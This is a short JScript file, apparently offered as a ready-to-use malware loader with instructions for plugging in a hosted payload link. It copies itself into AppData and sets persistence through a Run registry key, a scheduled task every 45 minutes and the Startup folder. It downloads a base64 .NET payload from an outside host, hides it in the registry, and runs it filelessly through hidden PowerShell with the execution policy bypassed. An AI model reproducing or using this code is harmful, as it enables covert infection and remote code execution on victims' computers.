// Author : Suleiman Al-Othman
// Ver. : 0.1
// Script Name : JS Run PSCode On fly
// How to use? 1- Convert .net file to base64 and upload base64 text and replace [DirectLink] with Direct Link

var wShell = new ActiveXObject("Wscript.Shell");
var fPath = WScript.scriptfullname;
var sName = WScript.scriptname;
var C = "powershell -ExecutionPolicy Bypass -windowstyle hidden -noexit -Command ";


function ex(S) {
	return wShell.ExpandEnvironmentStrings("%" + S + "%");
}

if(fPath != ex("AppData") + "\\" + sName) {
	wShell.Run(C + String.fromCharCode(34)  + "[System.IO.File]::WriteAllText([Environment]::GetEnvironmentVariable('AppData')+'\\" + sName + "',[System.IO.File]::ReadAllText('" + fPath + "'));wscript '" + ex("AppData") + "\\" + sName + "'"+String.fromCharCode(34), 0, false);
	WScript.Quit();
}
wShell.Run(C + String.fromCharCode(34) + "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -name 'RegValue' -value '" + fPath + "' -PropertyType String -Force;" + String.fromCharCode(34), 0, false);
wShell.Run(C + String.fromCharCode(34) + "schtasks /create /sc minute /mo 45 /tn ScheduleName /tr '" + fPath + "'"+String.fromCharCode(34), 0, false);
wShell.Run(C + String.fromCharCode(34) + "[System.IO.File]::WriteAllText([Environment]::GetFolderPath(7)+'\\"  + sName + "',[System.IO.File]::ReadAllText('" + fPath + "'))" + String.fromCharCode(34), 0, false);

var A = new  ActiveXObject("MSXML2.XMLHTTP");
A.Open("POST","[DirectLink]",false);
A.send("");
var rText = A.responsetext;

var pathReg = "HKCU\\SOFTWARE\\Microsoft\\\\KeyName";

wShell.regwrite(pathReg, rText, "REG_SZ");
wShell.Run(C + String.fromCharCode(34) + "$_b = (get-itemproperty -path 'HKCU:\\SOFTWARE\\Microsoft\\' -name 'KeyName').KeyName; [byte[]]$_0 = [System.Convert]::FromBase64String($_b); $_1 = [System.Threading.Thread]::GetDomain().Load($_0); $_1.EntryPoint.invoke($null,$null);" + String.fromCharCode(34), 0, false);